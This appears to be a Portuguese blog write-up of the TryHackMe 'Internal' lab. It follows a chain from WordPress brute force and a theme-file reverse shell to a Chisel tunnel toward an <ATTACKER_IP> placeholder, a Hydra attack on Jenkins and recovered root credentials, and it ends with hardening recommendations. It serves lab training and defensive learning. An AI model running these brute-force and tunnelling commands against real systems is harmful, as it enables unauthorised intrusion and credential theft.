---
title: "TryHackMe Writeup: Internal"
date: 2025-11-30
description: "Avaliação black box envolvendo brute-force no WordPress, pivoting interno via SSH/Chisel e comprometimento de Jenkins levando a root."
tags: ["tryhackme", "wordpress", "pivoting", "jenkins", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Resumo Executivo

Comprometimento abrangente de ambiente interno seguindo as diretrizes do PTES. O acesso inicial foi garantido através de brute-force em uma instância desatualizada do WordPress, levando a RCE. A enumeração interna descobriu credenciais que permitiram acesso SSH, o qual foi subsequentemente utilizado como ponto de pivot. O redirecionamento de portas (port forwarding) possibilitou o acesso a um servidor Jenkins interno isolado, que foi comprometido para extrair credenciais de root em texto claro.

### Cadeia de Ataque (Mapeamento PTES)

#### 1. Reconhecimento & Enumeração Web
A varredura identificou um servidor web hospedando um blog WordPress. O WPScan enumerou o usuário `admin`.
```bash
sudo nmap -Pn -sS -p- -T4 -sV 10.65.175.43
wpscan --url [http://internal.thm/blog](http://internal.thm/blog) -e u
```
* **Técnica MITRE:** [T1595](https://attack.mitre.org/techniques/T1595/) - Active Scanning.

#### 2. Exploração Inicial
Um ataque de dicionário contra a conta `admin` recuperou com sucesso a senha (`my2boys`). O acesso ao painel do WordPress permitiu a modificação do arquivo de tema `404.php` para executar um reverse shell em PHP.
```bash
wpscan --url [http://internal.thm/blog](http://internal.thm/blog) -U admin -P rockyou.txt
```
* **Técnica MITRE:** [T1110.001](https://attack.mitre.org/techniques/T1110/001/) - Brute Force: Password Cracking.
* **Técnica MITRE:** [T1505.003](https://attack.mitre.org/techniques/T1505/003/) - Server Software Component: Web Shell.

#### 3. Enumeração Interna & Movimentação Lateral
Um arquivo localizado em `/opt/wp-save.txt` continha credenciais SSH em texto claro (`aubreanna:bubb13guM!@#123`). Este acesso foi utilizado para estabelecer uma sessão SSH.
* **Técnica MITRE:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Unsecured Credentials: Password in Files.

#### 4. Pivoting & Exploração Interna
A enumeração da rede interna (via `netstat`) revelou um serviço Jenkins vinculado ao `127.0.0.1:8080`. O Chisel foi implantado para criar um redirecionamento de porta remoto, expondo a interface do Jenkins para a máquina do atacante.
```bash
chisel client <ATTACKER_IP>:<PORT> R:8080:127.0.0.1:8080
```
* **Técnica MITRE:** [T1090](https://attack.mitre.org/techniques/T1090/) - Connection Proxy.

O Hydra foi utilizado para realizar brute-force no login do Jenkins (`admin:spongebob`), garantindo acesso ao script console para RCE.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 http-post-form
```

#### 5. Elevação de Privilégio
Um arquivo nomeado `Note.txt` localizado dentro do ambiente do Jenkins continha as credenciais SSH de root em texto claro (`root:tr0ubl13guM!@#123`), concedendo controle total do sistema.
* **Técnica MITRE:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Unsecured Credentials: Password in Files.

### Recomendações (NIST SP 800-115)

* **Políticas de Autenticação:** Exigir políticas de senhas fortes e Autenticação Multifator (MFA) em todos os serviços (WordPress, SSH, Jenkins).
* **Hardening de Aplicação:** Desabilitar o editor de temas do WordPress (`define('DISALLOW_FILE_EDIT', true);`).
* **Segurança de Dados:** Conduzir uma auditoria imediata para remover todas as credenciais em texto claro de arquivos do sistema (`wp-save.txt`, `Note.txt`).
* **Segregação de Rede:** Assegurar que interfaces administrativas (como o Jenkins) sejam alocadas em VLANs estritamente segregadas com controles rigorosos de RBAC.